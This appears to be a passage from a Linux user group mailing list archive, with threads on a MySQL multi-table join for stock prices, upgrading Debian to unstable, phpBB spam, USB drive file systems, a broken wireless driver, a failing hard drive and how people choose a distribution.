There's an extension to LFS called Beyond Linux From Scratch (BLFS),
here are the pages from BLFS about these things:

http://www.linuxfromscratch.org/blfs/view/stable/basicnet/net-tools.html
http://www.linuxfromscratch.org/blfs/view/stable/basicnet/dhcpclient.html
http://www.linuxfromscratch.org/blfs/view/stable/basicnet/bind-utils.html

I googled for "setting hostname LFS" and got this:

http://www.mail-archive.com/lfs-book at linuxfromscratch.org/msg11702.html


My /etc/sysconfig/networking file (in Fedora 12) contains this line:
HOSTNAME=my.systems.fqdn

Sounds like you need bluetooth support. There isn't anything on this
in BLFS as far as I could find, so here's the package that most
distros (maybe all of them) use:

Subject: [PLUG] MSQL Cross-Table Query
Message-ID: <4B8CC7C0.4040307@cooper.stevenson.name>

Hello Everyone,

I've worked through the documentation but haven't yet worked out a
cross-table query in MYSQL yielding the correct results. My goal is to
pull data from four tables that correspond to the date-time stamp of the
first table. This will make sense as I describe what I am trying to pull
from the database below.

I have three tables entitled, "msft," "goog," "aapl," and "intc." Each
of these tables are in the same database entitled, "minute."

Here is an example of each (they're essentially the same):

msft:

      date             time        open   high     low      close    volume
| 2009-01-15 | 16:57:00 | 18.64 | 18.67 | 18.62 | 18.64 |  190394 |
| 2009-01-15 | 16:58:00 | 18.63 | 18.63 | 18.61 | 18.62 |   60652 |
| 2009-01-15 | 16:59:00 | 18.62 | 18.63 |  18.6 | 18.61 |  404419 |


goog:

      date             time        open   high     low      close    volume
| 2009-01-15 | 16:49:00 | 299.32 | 299.32 | 299.32 | 299.32 |    550 |
| 2009-01-15 | 16:51:00 | 299.93 | 299.93 | 299.93 | 299.93 |    500 |
| 2009-01-15 | 16:55:00 |  299.4 |  299.4 | 299.39 | 299.39 |    269 |


aapl:

      date             time        open   high     low      close    volume
| 2009-01-15 | 16:57:00 | 83.49 | 83.49 | 83.49 | 83.49 |         400 |
| 2009-01-15 | 16:58:00 | 83.49 | 83.49 | 83.49 | 83.49 |         350 |
| 2009-01-15 | 16:59:00 | 83.43 | 83.46 | 83.41 | 83.42 |        2290 |


intc:

      date             time        open   high     low      close    volume
| 2009-01-15 | 16:57:00 | 13.57 | 13.58 | 13.56 | 13.56 |        1400 |
| 2009-01-15 | 16:58:00 | 13.57 | 13.58 | 13.57 | 13.58 |        7517 |
| 2009-01-15 | 16:59:00 | 13.58 | 13.58 | 13.56 | 13.58 |        2950 |

What I would like to do is this: for each date & time combination for
table 'msft' include the close column for msft, goog, aapl, and intc.

An example would look like this:
     date               time       close   close   close    close
| 2009-01-15 | 16:57:00 | 18.64 | 299.32 | 83.49 | 13.56 |

Bonus points for doing this within a specific date range.

Thanks in advance for any help you may be able to provide.


Very Best,


Cooper Stevenson

something like

select m.close, a.close, g.close, i.close from msft m, aapl a, goog g,
intc i where date = "$date" and time = "$time"

I haven't tested this query, just off the top of my head. See if it
works and pulls out the date you're looking for and formats it
properly.

Doh I missed it, you'll want to add the date/time portion to the query
so that you get the date/time along with the closing prices also.

? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ?by

? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ?Jeri Ellsworth
? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ?(Circuit Girl)

? ? Jeri Ellsworth is a native Oregonian, born in Yamhill and raised
? ? in Dallas, Oregon. ?Early on she became fascinated with electronics
? ? and 8-bit computers setting the stage for her unique approach to
? ? learning. ?Not being challenged in school, she skipped higher
? ? education to pursue a career in car-racing and chassis fabrication.
? ? After that, she opened a chain of computer stores in Oregon and
? ? Washington. ?She sold those to peruse a career in chip design,
? ? which lead her to design the CommodoreOne - based upon the
? ? Commodore 64 - using reconfigurable logic and the C64 DTV 30-
? ? games-in-one joystick, selling, a quarter million units.
? ? She currently works as an Oregon based consultant.

? ? I'm not sure what Jeri is going to speak about yet, but judging
? ? the talk she gave at Sanford, it should be very good indeed.
? ? See a video of her Sanford talk at:
? ? http://video.google.com/videoplay?docid=-1053309060448851979#

? ? Also, see her webs sites at:

? ? and
? ? http://www.fatmanandcircuitgirl.com/

? ? Note: ?Jeri was originally scheduled to give this talk last month,
? ? but it didn't happen due to unexpected illess. ?Thus, we have
? ? reschedule her for March.

Pending an announcement from David, I wanted to provide a headsup that
I've got Jeri lined up to speak again this month.  If she gets sick
again, I'll have to leave town.  I just added a calagator event.

The same date has three different opening prices?  A high that drops with time?
A closing price that varies?

Modify Drew's SQL to include:

    where date BETWEEN '2005-01-01' AND '2005-12-31'  

or whatever dates you deem of interest.  

See http://www.plus2net.com/sql_tutorial/between-date.php

select m.close, a.close, g.close, i.close from msft m, aapl a, goog g,
intc i where date = "$date" and time = "$time"

I don't think this works because date and time are ambiguous; they could be
from any of the 4 tables.

When you write a join without join criteria the transitive closure of all
rows are generated and then the selection criteria applied.  This can result
in long query times.

I suggest something of the form

select "msft", close from msft  where date = "$date" and time = "$time"
union
select "goog", close from goog  where date = "$date" and time = "$time"
union
.. (the other two tables)

Disclaimer: These results are the to the best of my recollection.  I did not
test them anywhere.

   Yup.

   If the date and time are the same in all four tables you'd need a WHERE
clause that relates them all:

   WHERE a.date == g.date == i.date == m.date AND ... for the times.

   You can also do sub-selects from the tables.

I was sure I was missing something like that regarding date.time.

Yes, you may view a screenshot depicting my utilization of the minute

Note the minute difference-- each of the ohlc variables can change from
minute to minute.

I wrote, successfully,  a "date/time" query based on the tick data some
time ago. I suspected, through my reading of the documentation, that the
"narrowing of the fields--" so to speak--would be more complex than a
simple WHERE statement.

Thank for your effort.

Glad you were able to get it working.

I would suggest though, if you have the flexibility to change your
database structure, you might be better off with a single table like:

      date         time   symbol     open   high     low      close     volume
| 2009-01-15 | 16:49:00 | goog   | 299.32 | 299.32 | 299.32 | 299.32 |    550 |
| 2009-01-15 | 16:51:00 | aapl   | 299.93 | 299.93 | 299.93 | 299.93 |    500 |
| 2009-01-15 | 16:55:00 | msft   |  299.4 |  299.4 | 299.39 | 299.39 |    269 |

(obviously those numbers are wrong in this example)

This way you don't need to redundantly store your dates and times and
your cross-symbol queries become much simpler.  Any query you had
before which went against one of those individual tables can be
adapted with an additional where clause filter.

Good luck,
tim

Does mysql SQL support the UNION keyword? If so, you could run 2 queries.
The first query SELECTs the date and time you want, and the second query
SELECTs all the rows from all 4 tables with that date/time:

SELECT date, time FROM msft LIMIT 1;

SELECT * FROM msft WHERE date = :date AND TIME = :time
UNION
SELECT * FROM goog WHERE date = :date AND TIME = :time
UNION
SELECT * FROM appl WHERE date = :date AND TIME = :time
UNION
SELECT * FROM intc WHERE date = :date AND TIME = :time

(replace :date and :time with the values you obtained in the first query)

This is easily modified to query a date range:

SELECT * FROM msft WHERE date BETWEEN :whatever1 AND :whatever2
UNION
...etc

Your application logic can more easily calculate the date begin and end
points. Mysql has crappy support for stored procedures. We could do it all
in the database with a little PLSQL if you used Postgresql.

I wouldn't use the * in the query, BTW. I just did that to save typing.
Always explicitly specify the column names, especially in a UNION query. To
use UNION, the column names must match in all the SELECT statements.

If the database behaves in a transactional way within the lifetime of a
single SQL query, you could get away with this:

SELECT * FROM msft WHERE date = (SELECT date FROM msft LIMIT 1) AND TIME =
(SELECT time FROM msft LIMIT 1)
UNION
SELECT * FROM goog WHERE date = (SELECT date FROM msft LIMIT 1) AND TIME =
(SELECT time FROM msft LIMIT 1)
UNION
SELECT * FROM appl WHERE date = (SELECT date FROM msft LIMIT 1) AND TIME =
(SELECT time FROM msft LIMIT 1)
UNION
SELECT * FROM intc WHERE date = (SELECT date FROM msft LIMIT 1) AND TIME =
(SELECT time FROM msft LIMIT 1)

By "narrowing of the fields", do you mean a left or outer join between the
different stock tables?  I assume one of the big problems is the missing
samples, and possibly samples that don't fall on 0-second timestamps.

OK, I see your use and you are doing what you want.

However...

On any given day for a particular equity the opening price is a single
value. 
The opening price does not change through the day.? It was
fixed at the first trade of the day.

The opening value reflects the "opening" for that minute.

I have to narrow the results between a start and end date. For example,
I may only need 5 weekdays of intraday tick data.

I have complete data. The trouble is that I only want the close prices
from four of the tables that directly correspond to the date/time of the
first table.

For example, I want the close prices from msft, goog, aapl, and intc but
these results must match up with msft's date and time stamp. To say this
in English:

  "I want the close pricess for all four securities for 9:01:00 on
2009-01-02. Then I want the close prices for all four securities for
09:02:00 on 2009-01-02..." and so on.

No way did I give up on you guys! I'll post a solution once I've struck

Coop,

   Rick van der Lans' book, "Introduction to SQL, 4th Edition," is great for
learning how to write the type of complex SELECT statement you need. Very
highly recommended. It is also the only really good source of information on
time-based queries which is also what you're addressing. Joe Celko
recommended Rick's book to me, and I proof-read Rick's SQLite-specific book.

If you know for sure that you are going to have data for every minute
and never duplicate data, and that the `time` column will always be 0
seconds, something like:

select m.`date`, m.`time`, m.`close`, g.`close`, a.`close`, i.`close`
from msft m
join goog g on g.`date` = m.`date` and g.`time` = m.`time`
join aapl a on a.`date` = m.`date` and a.`time` = m.`time`
join intc i on i.`date` = m.`date` and i.`time` = m.`time`
where m.`date` between '2010-02-28' and '2010-03-02'

you may want to look at combining the date and time columns into one
column, with a type of datetime or timestamp.  May also want to look
at normalizing the data, either putting it all into one table or else
something like:

entry:
| id | date | time |

msft:
| entry_id | open | high | low | close | volume |

goog:
| entry_id | open | high | low | close | volume |

aapl:
| entry_id | open | high | low | close | volume |

intc:
| entry_id | open | high | low | close | volume |

Tim, you nailed it. You're query worked flawlessly. Have a look:

date    time    close   close   close   close
2009-01-05      09:14:00        20.2    319.49  93.62   15.05
2009-01-05      09:26:00        20.15   320     93.28   15.07
2009-01-05      09:28:00        20.19   320     93.16   15.08

That's just good information.

Moreover, I've started asking myself, "why does this work," and from
other responses, "what really is the deal with UNIONs and JOINs?"

I am now also thinking of the steps necessary to re-engineer my database
based on Tim's suggestion.

Carlos, Konstanski, too, offered a few "fleshed out" solutions--you can
tell he know what he's doing and gave me pause for thought.

I'm impressed with the way you guys "locked on" to the problem and ran
with it.

Thanks very much to all of you for your insightful answers, suggestions,
and references I can turn to for more information. I am grateful as late
last night (early this morning?) it appeared as I was looking at having
to climb a mountain.

If you guys want a prediction for next week's MSFT stock, let me know.  ;)

All in a day's work. There's a lot to be said for learning the fundamentals;
then you can solve problems all day long. In SQL, this means getting a solid
grip on joins, subselects, and transactions, among other things. Naturally
each database engine has its own syntactical quirks. Fancy stuff like
connectby() can wait till later.

Be careful with joins. They have a lot of overhead. A faulty join can do bad
things to your database, like consuming vast amounts of temp space (which
cannot always be reclaimed, at least in Oracle) and taking forever to run.
Keep them as small and simple as possible. Every Oracle PLSQL developer has
hosed a database at least once in his career with a bad join.

If you have a join that takes a lot of time to run, you might want to
consider running it on a schedule, and storing the results in a single
table. Querying the same data from the single table requires far less
effort, and runs far more quickly. But it won't be real time. I'm not
suggesting this technique for this particular problem; it's one of those
fundamentals to have in your toolbox.

Tables with the same structure with different names are an indication that
you're confusing data with structure.  In this case, "goog" is really a data
item, not a structure item, so it should be a column in the table, not the
name of the table.

However, if you *needed* these tables separate (for datawarehousing for
example), and you were using Postgresql (which I recommend wholeheartedly over
MySQL except when compatibility is a must), you could partition your tables as
an inherited structure, so that querying "stocks" would essentially be a union
of all stock-derived tables.

Yes, good point. The only time I ever used UNION was in a SmartPlant P&ID
system, where they have 4 different tables that store the same types of data
for 4 different kinds of equipment (vessel, mechanical, electrical, and
something else I can't remember). What a god-awful schema that was.

I'm super new to Debian and I'm trying to track down a JVM issue (not
related to the distro I don't think) and need to upgrade to unstable
for testing. Can someone hit me with the clue stick or link me to the
proper docs to do this?

Edit /etc/apt/sources.list to read:

deb http://debian.osuosl.org/debian/ unstable main contrib non-free
deb-src http://debian.osuosl.org/debian/ unstable main contrib non-free
deb http://security.debian.org/ unstable/updates main contrib non-free

Then run:

$ sudo apt-get update
$ sudo apt-get dist-upgrade

Actually, security probably doesn't have an unstable dist; so leave this
one out.

? ? learning. ?Not being challenged in school, she skipped higher
? ? education to pursue a career in car-racing and chassis fabrication.
? ? After that, she opened a chain of computer stores in Oregon and
? ? Washington. ?She sold those to peruse a career in chip design,
? ? which lead her to design the CommodoreOne - based upon the
? ? Commodore 64 - using reconfigurable logic and the C64 DTV 30-
? ? games-in-one joystick, selling, a quarter million units.
? ? She currently works as an Oregon based consultant.

? ? I'm not sure what Jeri is going to speak about yet, but judging
? ? the talk she gave at Sanford, it should be very good indeed.
? ? See a video of her Sanford talk at:

Message-ID: <e89b36dd1003042003uf3d0c01kf9e80b235a51c47e@mail.gmail.com>

I may not be asking this question on the list, but here goes. I am new to
administrating a phpbb forum on my site. I have been getting tons of
spammers and am trying to figure out how to possibly eliminate the problem.
I am running phpbb3 on Ubuntu 9.10 Server. I have read about the MODS for
textual questions and answers but cannot figure out how to install them on
Ubuntu.

Anyone have any ideas on how to help alleviate the spamming problem of a
forum board?

Any help or pointers is greatly appreciated, or you can tell me I am in the
wrong place for this question if that is the case

Thank you

Randy

A fairly simple workaround is to add a custom field to the registration 
page, that has an incorrect default value.

For instance, you could ask, "What year is this?"

In this case, you would set a default value of 2009 (or 1982, or 
whatever past year you want), and set the field value so it must be 
greater than, or equal to 2010, in order to successfully register a 
forum user.

This for me has pretty much stopped forum spam in its tracks.

OK, I have read about that, is that just adding to the existing config file?
As I stated I am new to this and live in a very small community. I am trying
to put this together help people in the community out.

Thank you

Message-ID: <498756ed1003042249x541c0287l1f08072fafcdac9c@mail.gmail.com>

Hi,

Is there some PLUG meeting where I can go to, or something, where I
can play with the N900.  Does somebody own one and can bring it to
Freegeek or whatever, so I can see it and touch it.  Also, as a bonus,
would this same person know how to get the best deal out of a T-mobile
Business account.  My brother has a T-mobile business account, not a
consumer account.  I know I can't get a discount on the price of the
phone through T-mobile, but I think I can get a monthly discount on
the bill because the phone would be bought at a ridiculously high
price.  Anyways....I'd like to see the phone and play with it a bit.
I've never owned a smart phone, and since I'm a little bit brainwashed
by linux, I figure I should check out this phone.

Thanks,
Victor Soich

I don't think it will require any modifications, and should be pretty 
easy to implement.

How many legitimate sign-up's do you have each day? You could just 
change it to moderator approved instead of the automated email process.

I have it set to moderator approved now. I am still spreading the word
throughout the community in which I live so it is a new startup and haven't
had any legit takers yet. I have just been getting tired of the 20 to 30
inactive user accts that do not activate due to bad email accts. I think the
added questions on the registration page have resolved some of the issue so
far.

Thanks for the input.

Randy,

One thing we did on one board I've been on was to make all legitimate, 
non-spammer users part of a custom group, Full Members.  (All new
members are part of the Registered Users group by default.  That's
apparently fixed in phpBB, and can't be changed.)  Full Members have
all the normal posting privileges.  New members make a posting in a
forum specifically for them (the only one open to Registered Users),
saying something about the site. Those postings are not visible to the
rest of the site.  The moderators read the post, and if they approve,
the new member's posting is approved, making it visible to all, and he
or she is made a Full Member.

Now on a busy board this can take up a lot of the moderator's time.  In
fact, the board I'm on has volunteers who weed through the new
postings.  They disapprove spammers, reporting them to the mods.
Newcomers who make the grade (it doesn't really take much) are
approved, get Full Member status, and a Welcome! We Want Poetry!
message.  (We pester newcomers for poetry.  It's not much of a
tradition, but it's what we've got.)  If a new member later turns out
to be a spammer in disguise, well, out comes the banhammer.  Wham!

Another thing you can do is ban specific IP addresses, blocks of
addresses, or various domains.  A few months ago our admin went so far
as to ban everyone in the .ru domain.  The number of spammers dropped
precipitously.

Anyway, I hope this helps.

Hi

I have a 400 GB USB portable drive that I need to do READ/WRITE between
Linux, Win XP and MacOS X.
It is currently in FAT which has a 4GB file size limit.  Is NTFS the right
format to go?  I
seem to recall Linux can do full read/write to NTFS.  Just want to see if
anyone else has similar experience
to share.


thanks

Thank you Dale. So far after adding the extra registration questions, I
haven't had any issues. I do currently moderate all postings and adding a
new group may also work after I start building the community.

Thank you all for your help, it is very much appreciated.

I haven't looked into it in several years, but I recall Linux's NTFS
support as being essentially read-only. It could write to an NTFS file
system, but was risky. Do you need support for files larger than 4 GB?
If not, stick with VFAT. All three operating systems have solid
support for it.

Do you need something larger than a 4GB file?  The volume limit is 8TB.
NTFS on Linux is in some kernels but not all.  I'm not sure how MacOS X would
do with a NTFS volume.  FAT32 is safer unless you needs permissions or files
larger than 4GB.

Ubuntu on my machine since 7.04 has had r/w access to my NTFS volumes. I 
would go NTFS. If you have a spare thumb drive around and you don't want 
to format your 400GB you could test it with that.

thanks for all responses....It looks like NTFS is not supported in MacOS X.
Will try Linux this weekend.

Ok, sticking with FAT and file size under 4GB for now....

At least Windows and Linux will very reliably read/write to ext2/3
file systems. I've never tried with OSX, but in looking on the
internet, it looks like it might be able to handle it as well.

There's a system driver that you can download to support ext2/3 under windows.

That's the way I go if I need a system to use the larger files.
Otherwise I would go with FAT32, as otherwise suggested. Few files
need to be bigger than that!

There is a ext2/3 driver/software for Windows, not sure if it's
something you could mount under Mac OSX but it's an option that might
work well if it's supported.

I've been thinking that the solution to this type of problem is to
instead of getting a USB drive get a small NAS server.  They handle
just about every network file sharing protocol.  FTP, HTTP, NFS,
SAMBA, and whatever it is that Mac OS uses plus block sharing
protocols like iSCSI, and ATAoE.  I don't know how easy it is to use
one outside of a lan though.  It seems like a crossover cable would
work, but assigning a network address might be tricky.

Did you ever look at MacFUSE or NTFS-3G (includes McFUSE) for NTFS on Mac?

Thanks, I will check out these suggestions.  Looks like there are more
options than I initially thought.

Subject: [PLUG] OpenSuSE 11.2 busted my wireless
Message-ID: <alpine.LNX.1.10.1003071544400.8577@grond.sourballs.org>

Here's a mystery - a wireless card works with OpenSuse 11.0; with OpenSuse 
11.2, it no longer works.  Reverting to 11.0, and it works again.  I don't 
know enough about the details of wireless to know how to fix the problem, 
assuming it can be fixed.

The hardware:
------------
Router:
Linksys WRT54G, firmware v8.00.2

Wireless card:
Linksys WUSB11 V2.6 802.11b


The WORKING setup:
-----------------
OpenSUSE 11.0

driver software:
at76_usb
(identifed in log messages as 'Atmel at76x USB Wireless LAN Driver 0.17')

interfaces managed by NetworkManager and wpa_supplicant

At boot, interface comes up and works:

  Feb  2 14:44:57 boxn ifup-wireless:     wlan0     warning: using NO encryption
  Feb  2 14:44:57 boxn ifup-wireless: command 'iwconfig wlan0 nick boxn' returned
  Feb  2 14:44:57 boxn ifup-wireless:  Error for wireless request "Set Nickname" (8B1C) :
  Feb  2 14:44:57 boxn ifup-wireless:     SET failed on device wlan0 ; Operation not supported.
  Feb  2 14:44:57 boxn ifup:     wlan0
  Feb  2 14:44:57 boxn ifup: IP address: 192.168.1.6/24
  Feb  2 14:44:57 boxn ifup:

I get the warning about not being able to set the card nickname via 
iwconfig, but the connection is fine.


The BROKEN setup:
----------------
OS:
SuSE 11.2 release

driver software:
at76c50x-usb
(identifed in log messages as 'Atmel at76x USB Wireless LAN Driver 0.17')
(yes, the same as before)

interfaces managed by NetworkManager and wpa_supplicant

At boot, the wireless card 'sees' the access point, but is never able to 
connect to it (MAC addresses anonymized):

  Mar  6 15:07:22 boxn ifup:     wlan0     name: WUSB11 V2.6 802.11b Adapter
  Mar  6 15:07:22 boxn ifup-wireless:     wlan0     warning: using NO encryption

  Mar  6 15:07:23 boxn kernel: [ 2821.108924] wlan0: direct probe to AP 00:01:02:03:04:05 try 1
  Mar  6 15:07:23 boxn ifup:     wlan0

  Mar  6 15:07:23 boxn kernel: [ 2821.508091] wlan0: direct probe to AP 00:01:02:03:04:05 try 3
  Mar  6 15:07:23 boxn kernel: [ 2821.708032] wlan0: direct probe to AP 00:01:02:03:04:05 timed out

at this point, if I run iwconfig, the 'Access Point:' comes back as 'Not 
Associated'.

If I tried to manually run 'iwconfig wlan0 ap 00:01:02:03:04:05', 
/var/log/messages showed:
  Mar  6 15:20:25 boxn ifup:     wlan0     name: WUSB11 V2.6 802.11b Adapter
  Mar  6 15:20:25 boxn avahi-daemon[7757]: Server startup complete. Host name is boxn.local. Local service cookie is 1939683509.
  Mar  6 15:20:25 boxn ifup-wireless:     wlan0     warning: using NO encryption
  Mar  6 15:20:25 boxn ifup:     wlan0
  Mar  6 15:20:25 boxn ifup: IP address: 192.168.1.3/24
  Mar  6 15:20:25 boxn ifup:
  Mar  6 15:20:25 boxn kernel: [ 3603.741386] wlan0: authenticate with AP 00:01:02:03:04:05
  Mar  6 15:20:26 boxn kernel: [ 3603.940027] wlan0: authenticate with AP 00:01:02:03:04:05
  Mar  6 15:20:26 boxn kernel: [ 3604.140066] wlan0: authenticate with AP 00:01:02:03:04:05
  Mar  6 15:20:26 boxn kernel: [ 3604.340076] wlan0: authentication with AP 00:01:02:03:04:05 timed out

...and running 'iwconfig' still shows the access point as 'Not 
Associated'.

In both cases, encryption is turned off just to take that complication out 
of the picture.

'iwlist wlan0 scanning' finds the access point, no problem, and none of 
the other machines in the house have any trouble connecting.  It's just 
this machine, when 11.2 is installed.

Any thoughts as to how I would further debug this problem? (I'm not sure I 
will, at least not soon - the box in question is my wife's, and she's just 
happy to have a working OpenSuse 11.0 installed.)

Anything in the WRT logs? Try running something like wireshark or
tcpdump directly to see if what is causing the problem might be
exposed a little lower in the stack.

Message-ID: <867b13e91003080932r35e4f0bew41eaf49fd1f917e2@mail.gmail.com>

I'm hoping for a quick diagnosis from someone more knowledgeable about
hardware than me (which is most people on this list, for starters), or
to find out, at least, that there's no obvious solution.

This morning my computer died while I was using it ... just shut
itself off, as if the power had gone out, except it hadn't.  When I
try rebooting, I hear several "clicks" -- probably six or eight, about
a second apart -- as the ASUS BIOS message flashes on screen.  Then a
pause, then a few more clicks as it switches to this screen:

VIA Technologies, Inc. VIA VT8237 Serial ATA Raid BIOS Setting Utility V2.01

Scan Devices, Please wait...
Press <Tab> key into User Window!

Hardware Initiate failed, Please Check Device!!!
The Bios does not be installed.  Press <g> to continue!

(Yes, it really does say "Hardware Initiate" and "Bios does not be installed.")

Pressing 'Tab' does nothing.  Pressing 'g' just takes me to a screen
that says insert a bootable device.

Does this sound like it could be the hard drive that failed?  I
thought those commonly gave some warnings, like wonky behavior in
advance of complete failure, but perhaps that's only true when some
sectors of the drive are wearing out.  Everything had been working
fine, then kabluey.  I have a spare hard drive, but I'm not sure how
to go about replacing the existing drive.  Do I have to reinstall the
BIOS?  (I have an ASUS disc I've never even taken out of its package.)

Or could it be something else that has died?

Any advice on what to try to do?  I'm in the dark about this, and now
without a computer.

Thanks,
Michael

Those messages are confusing, but I'm going to take a guess that it's
a drive failure.  Note the BIOS message was in relation to a Serial
ATA RAID BIOS.  Maybe when the drive stopped responding, the system
BIOS went into a different mode and tried to identify if you have RAID
arrays.  The clicking noises are certainly consistent with a drive
failure.

I would just try putting in a fresh drive and see if you can get a
base OS install on it.  If run into hardware problems with that, then
you can start narrowing it down to other pieces of hardware.

Good luck,

I agree with Wayne.  You'll need to verify that your BIOS is set to boot
from the CD first.

This link (should you have access to a computer that can view it, hmmm....
how ARE you getting to this mailing list?) has a nice little video about the
hard drive 'click of death'  which you can use for comparison to the sounds
that you hear from your drive.

Thanks all.  I will try booting from the CD-ROM first (the BIOS is set
to boot from the CD first) -- would've tried that already, except that
I didn't have time this morning.  If that works, then I'll try putting
in a new drive and see if I can get anywhere.

And I'll check out the video, when I get over to the library later.
At the moment, I'm using a computer at an office I sometimes do some
work at.

Sigh ... should be an interesting afternoon/evening.

It is possible for a hard drive to fail utterly all at once, but you
are correct, it is unusual. Normally there are warnings - the computer
starts crashing randomly, the drive starts making funny noises, or
there are read/write errors when saving and retrieving files.

The first things I would check are the power and data connections. 

If that produces no solution, then I would boot to a rescue CD, and
then run fsck on the hard disk if I could at least get the rescue CD to
see it.

Actually, I would recommend against running fsck on a disk suspected
of hardware failure until after you've recovered your data.  You're
just asking to damage more data by writing to the disk.  I would first
try to recover your important files using something like the
sleuthkit/autopsy.  There are boot disks which include these, such as
Helix and FCCU. 

Once you've safely recovered any files you can, you can always try to
run the fsck if you think the drive isn't actually dying.

Good luck,
tim

Update on this problem.

Bought a new computer...

Should come in the mail tomorrow..

Only disk I have is Ubuntu 8.04

Can I install that and then change /etc/apt/sources.list?

and install xubuntu??
And  do

apt-get update
apt-get dist upgrade


And what would the sources.list look like??

Or did I misunderstand..??????

Or I did get a Fedora 12 disk in the mail today...  I could try that???...


TIA

Hi,

I sent the below message to the plug list.  Is it inappropriate?  I am
not Nokia shill or a troll.  I just want to see this phone in action,
and figured if anyone
had it, it would be someone from this list.  It's a linuxy phone.

Hi,

Is there some PLUG meeting where I can go to, or something, where I
can play with the N900. ?Does somebody own one and can bring it to
Freegeek or whatever, so I can see it and touch it. ?Also, as a bonus,
would this same person know how to get the best deal out of a T-mobile
Business account. ?My brother has a T-mobile business account, not a
consumer account. ?I know I can't get a discount on the price of the
phone through T-mobile, but I think I can get a monthly discount on
the bill because the phone would be bought at a ridiculously high
price. ?Anyways....I'd like to see the phone and play with it a bit.
I've never owned a smart phone, and since I'm a little bit brainwashed
by linux, I figure I should check out this phone.

Ubuntu 8.04 is the most recent LTS (long term stable) release. The next
LTS release will be 10.04, due out toward the end of this April. If you
install 8.04 you can do a dist-upgrade when 10.04 comes out.

The latest and greatest is Karmic, 9.10. 

If you want the latest I have it on a USB drive and will be happy to
burn you a CD. Of course, you can download it yourself, but if you are
dependent on library computers at the moment, that may not be an
option. Let me know if I can assist.

Also, is your 8.04 disk 64-bit? If you are getting a new computer,
surely you will want 64-bit Linux. Again, I can help if you need a
different CD.

I have to leave about 9:30 tomorrow morning, and won't be back until
after 5:30. But if I know before I leave that you need a CD I can leave
it on my front porch or something for you.

   You can also wait until the clinic on the 20th. You'll have your choice of
distributions and assistance getting your favorite installed.

   But, you can also install what you have and then use that to upgrade the
distribution. IIRC, the upgrade manager will tell you there's a new version
available and ask if you want to upgrade.

Fedora 12 is solid.  I ran it for a while and liked it.  I could switch 
to Fedora if Kubuntu became a problem.  Give it a try.  You can always 
switch to something else at the clinic.

I have had lots of problems with cat5 couplers. I have also had some that
worked for years on end. But the ones I had trouble with was usually due to
moisture. I suppose they would also be vulnerable to temperature. Is the
coupler in a very insulated environment? I had one in my garage go bad.

If at all possible, I would highly recommend replacing the entire run with a
single cable.

You can test this by just running a single long cable from end to end along
the ground for a few minutes. It will either work, or it won't.

It is somewhat appropriate. I think if it was too far out of bounds, you

I just don't think anyone has one that they want to go out of their way to

   This brings up a related question: what criteria do you (collectively, not
just Marvin) use in selecting a distribution? Does the choice depend on the
system being used personally compared with professionally (knowing,
supporting, and recommending distributions?)

Just curious,

When all is said and done, I think I rely on four criteria:

  1. Stable vs. fast moving. Does the job at hand require
     stability or the latest and greatest software releases?

  2. Available packaged software. Does the distribution offer
     tested and maintained packages of the software I need on
     this machine?

  3. Hardware support. Does the distribution, out of the box, support
     the target hardware?

  4. Sysadmin skillset. Who's maintaining this system and what
     administrative tools are in their comfort zone?

I mostly choose based on how much I like the mascot or logo of a given
distro. By this criteria, FreeBSD wins.

I started with Suse 7.something, moved to Kubuntu, then switched to 
Ubuntu during the last major upgrade.  KDE on my Lenovos was too badly 
broken to stay with.  I am testing Kubuntu 10.04 now on the test 
machine.  I try other distributions as time allows for education sake.  
I am most comfortable with the 'buntus these days.  I could be convinced 
to try most anything and would be willing to change if it was better.

I started out on Slackware and haven't changed in 10+ years, old
habits I guess. I have tried out Fedora, Ubunutu et al and always come
back to Slackware. I agree with the points made by Paul though, those
are all reasonable criteria.

I too am a long time Slacker, but disappointed with Slackware 13.0. Not 
really disappointed with Slackware as much as KDE 4. Do you use KDE?

Wayne,

   Well, that's 3 of us. :-)

   I've used only Xfce the past dozen years. It's getting more bloated, but I
don't install or use most of it.

OK, that's a bad sign right there.  Your cable (or maybe NIC or switch) had
a problem from the get-go, and now it's gone from 90% broken to 100% broken.

It's probably your coupler, or some spot where the cable rubs against a
sill or edge, or runs by something hot.  Note also that you're only good
for 300' in a single run of cable, even with no coupler in the middle.

You're gonna have to test each run.  Either one should be good for 1000 Mbps.

Thx for the advice, John & Tim & etc.  Turns out too much came up
yesterday for me even to deal with it ... maybe later today.  I'm
gonna have to swing by Free Geek to pick up an Ubuntu install disc
before I can really do anything with a replacement hard drive, anyway.

Funnily enough, though, the video Tony recommended led me to the same
video on YouTube, which then led me to a one-minute video from user
"MushiYoshi" that documents almost exactly what it sounds like is
happening with my machine, right down to the clicks and the "Bios does
not be installed!" screen:

http://www.youtube.com/watch?v=Y_rjspXC23c

Amazing what you can find on YouTube these days ... I never would've
thought of looking there for insight into this problem, though in the
past I have seen some good Linux/BSD how-to videos there.

FYI, I don't actually need to recover any of the data from the disc.
It's all backed up.  My data is backed up, that is -- the OS/system
data is not, hence the need for an install disc.

Laptop, Desktop, or Server = lightweight OS / Window Manager, all the bells
& whistles, or no GUI at all.

What's the box's main purpose = personal, file server, web server, email
server, firewall/vpn, router.
* I think some distros are a bit better suited for specific tasks.

And then the last thing is do I want to use it for bus/work or for play =

   Thank you for sharing your thoughts on this topic. Most everyone follows
Paul's line of thinking to a greater or lesser degree.

   I originally picked Red Hat (in 1996) because it was recommended by a
Powell's Tech Book Store salesman as locally more popular than was Slackware
at the time. I stuck with that from 4.0 through 7.3 when I switched to
Slackware for the stability, upgrade ease (which has deteriorated somewhat
in the last few releases), and being far enough back from the bleeding edge
that I didn't need to pay a lot of attention to it.

   On my wife's laptops I replaced Slackware with Xubuntu only because the
latter more easily recognized the ancient hardware and had everything
working. While I don't particularly like having to be familiar with two
distributions, it's working OK here.

   I'm still undecided on whether to install the 64-bit version of
Slackware-13.0 on my AMD Athlon X2 server/workstation. I don't know that it
buys me anything of value (to me) for such a small network, and it would
probably be different from the 32-bit version on my notebook.

Debra,

   Have you looked at the supported hardware on www.sane-project.org? That
will tell you how well it's supported.

   If it is listed, install SANE (Scanner Access Now Easy) with the Xsane GUI
front end. It should detect the available hardware and is quite easy to
figure out how to use it to scan what you want.

If you want a very fast easy to configure distro, try mepis antiX 8.5. It's
Debian based with Fluxbox and IceWM window managers. It ran great on a 11 yr
old Dell w/ P 933mhz cpu and 128 RAM. One of the best with old machines and
its srcreams on a now PC.

